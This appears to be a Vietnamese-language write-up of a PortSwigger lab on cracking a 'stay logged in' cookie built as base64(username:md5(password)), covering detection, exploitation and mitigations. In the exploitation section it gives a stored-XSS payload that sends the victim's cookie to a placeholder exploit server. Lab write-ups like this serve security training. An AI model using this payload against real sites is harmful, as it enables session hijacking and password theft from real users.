## Cách phát hiện
- Ở lab này khi ta đăng nhập tài khoản attacker có tick stay logged in thì nó có hiện đoạn ![Pasted image 20250906194735.png](../../assets/portswigger/Pasted%20image%2020250906194735.png)
- Nó được encode bằng base64 ta decode thử thì ta thu được ![Pasted image 20250906194846.png](../../assets/portswigger/Pasted%20image%2020250906194846.png)
- Và khi ta giải mã đoạn được decode từ base64 ra thì thu được![Pasted image 20250906223900.png](../../assets/portswigger/Pasted%20image%2020250906223900.png)
- Như vậy đoạn cookie có dạng `base64(username:md5(password))` 
## Cách khai thác

Như ở trên cookie có dạng như thế và ở lab này ta có thể dùng xss lấy được cookie của victim để test thử xss nó bị lỗi ở đâu![Pasted image 20250906224245.png](../../assets/portswigger/Pasted%20image%2020250906224245.png)
![Pasted image 20250906224348.png](../../assets/portswigger/Pasted%20image%2020250906224348.png)
như vậy ta đã tìm dược lỗi xss ở phần comment
Như vậy ta dùng `<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>` để lấy cookie victim và ta thu được![Pasted image 20250906224542.png](../../assets/portswigger/Pasted%20image%2020250906224542.png)
ta chỉ cần decode như phần trên là được và ta thu được 
![Pasted image 20250906224817.png](../../assets/portswigger/Pasted%20image%2020250906224817.png)

## Cách phòng tránh
- không bao giờ lưu password ở trong cookie
- Dùng random session token thay vì username:hash(password)
- Trong cookie cần flag HttpOnly + secuse
- FIx xss